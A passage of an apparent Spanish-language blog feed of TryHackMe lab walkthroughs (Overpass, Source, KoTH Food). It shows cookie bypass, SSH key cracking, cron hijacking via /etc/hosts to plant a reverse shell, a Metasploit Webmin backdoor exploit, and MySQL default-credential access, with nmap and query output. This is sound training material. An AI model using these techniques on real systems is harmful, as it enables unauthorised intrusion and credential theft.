&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;james---user&#34;&gt;JAMES - USER&lt;/h2&gt;
&lt;p&gt;En este caso no hay un control encuanto a las cookies por lo que podemos establecer una cookie cualquiera o vacia y logramos ver lo que esta restringido, utilizamos burpsuite para establecer la cookie en vacio y logramos ver el contenido, en donde nos muestra una clave privada encriptada y el nombre de un usuario (&lt;code&gt;james&lt;/code&gt;).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_184824.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;ssh2john&lt;/code&gt; para obtener el hash y john para obtener la frase del archivo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_185045.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la frase y la clave, logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_191307.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;cat /etc/crontab&lt;/code&gt; y encontramos un cronjob del usuario root, en el que descarga un archivo bash y lo ejecuta en la direccion &lt;code&gt;overpass.thm&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_210849.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Editamos el archivo &lt;code&gt;/etc/hosts&lt;/code&gt; y agregamos nuestra ip en lugar de la de &lt;code&gt;overpass.thm&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_211028.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Creamos un archivo con una shell inversa, creamos un mini servidor con &lt;code&gt;python3 -m http.server 80&lt;/code&gt;, ademas creamos dos carpetas &lt;code&gt;/downloads/src/&lt;/code&gt; en donde estará nuestro archivo de la shell. Esperamos a que haga la solicitud y ejecute nuestro archivo, logramos obtener una shell root y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_211722.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/overpass/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/overpass/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Source</title>
        <link>https://sckull.github.io/posts/source/</link>
        <pubDate>Wed, 22 Jul 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 22 Jul 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/source/</guid>
        <description>Source es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Source es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/source/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Source&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DarkStar7471&#34;&gt;DarkStar7471&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (10000) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Jul 17 02:32:30 2020 as: nmap -sV -o nmap_scan_mini source.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; source.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.133.161&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
10000/tcp open  http    MiniServ 1.890 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Webmin httpd&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Jul 17 02:33:40 2020 -- 1 IP address (1 host up) scanned in 69.98 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos webmin en el puerto 10000.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/source/Screenshot_20200717_013607.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;metasploit&#34;&gt;METASPLOIT&lt;/h3&gt;
&lt;p&gt;Utilizamos metasploit en donde encontramos el exploit &lt;code&gt;exploit/unix/webapp/webmin_backdoor&lt;/code&gt; y lo usamos en contra la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 &amp;gt; search webmin

Matching &lt;span class=&#34;nv&#34;&gt;Modules&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;================&lt;/span&gt;

   &lt;span class=&#34;c1&#34;&gt;#  Name                                         Disclosure Date  Rank       Check  Description&lt;/span&gt;
   -  ----                                         ---------------  ----       -----  -----------
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;  exploit/unix/webapp/webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE

msf5 &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener una shell con el usuario root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/source/Screenshot_20200717_014330.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien encontramos la flag &lt;code&gt;user.txt&lt;/code&gt; y &lt;code&gt;root.txt&lt;/code&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/source/Screenshot_20200717_014553.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/source/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/source/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - KoTH Food CTF</title>
        <link>https://sckull.github.io/posts/kothfood/</link>
        <pubDate>Thu, 09 Jul 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 09 Jul 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/kothfood/</guid>
        <description>KoTH Food CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;KoTH Food CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/kothfood/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;KoTH Food CTF&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;April 2020 KoTH box&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;*&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/NinjaJc01&#34;&gt;NinjaJc01&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (15065), mysql (3306) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Jul 14 23:33:16 2020 as: nmap -sV -o nmap_scan_mini kothfood.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; kothfood.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.77.34&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
9999/tcp open  abyss?
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Jul 14 23:35:18 2020 -- 1 IP address (1 host up) scanned in 122.15 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Jul 14 23:48:02 2020 as: nmap -sV -p- -T5 -o nmap_scan kothfood.thm&lt;/span&gt;
Warning: 10.10.132.29 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; kothfood.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.132.29&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65523&lt;/span&gt; closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3306/tcp  open     mysql   MySQL 5.7.29-0ubuntu0.18.04.1
9999/tcp  open     abyss?
15065/tcp open     http    Golang net/http server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Go-IPFS json-rpc or InfluxDB API&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
16109/tcp open     unknown
32229/tcp filtered unknown
46211/tcp filtered unknown
46969/tcp open     telnet  Linux telnetd
47002/tcp filtered unknown
48690/tcp filtered unknown
48972/tcp filtered unknown
52197/tcp filtered unknown
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Jul 15 00:01:53 2020 -- 1 IP address (1 host up) scanned in 830.63 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;primera-parte&#34;&gt;Primera Parte&lt;/h2&gt;
&lt;p&gt;A continuacion se muestran los dos caminos (partes) que se encontraron para obtener una shell y escalar privilegios, además el lugar donde se encuentran las flags.&lt;/p&gt;
&lt;h2 id=&#34;mysql&#34;&gt;MYSQL&lt;/h2&gt;
&lt;p&gt;Nos conecatmos en el puerto 3306 con las credenciales por default (root:), en donde encontramos una base de datos (&lt;code&gt;users&lt;/code&gt;) que contiene unas credenciales y una flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;MySQL &lt;span class=&#34;o&#34;&gt;[(&lt;/span&gt;none&lt;span class=&#34;o&#34;&gt;)]&lt;/span&gt;&amp;gt; show databases&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+--------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Database           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+--------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; information_schema &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; mysql              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; performance_schema &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sys                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; users              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+--------------------+
&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; rows in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.176 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

MySQL &lt;span class=&#34;o&#34;&gt;[(&lt;/span&gt;none&lt;span class=&#34;o&#34;&gt;)]&lt;/span&gt;&amp;gt; use users&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Reading table information &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; show tables&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+-----------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Tables_in_users &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+-----------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; User            &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+-----------------+
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; row in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.152 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

MySQL &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from User&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+----------+---------------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; username &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; password                              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----------+---------------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ramen    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ... snip ...                       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; flag     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; thm&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----------+---------------------------------------+
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; rows in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.149 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

MySQL &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ramen---user&#34;&gt;RAMEN - USER&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales que encontramos en la base de datos en el servicio SSH, logramos obtener una shell.&lt;br /&gt;
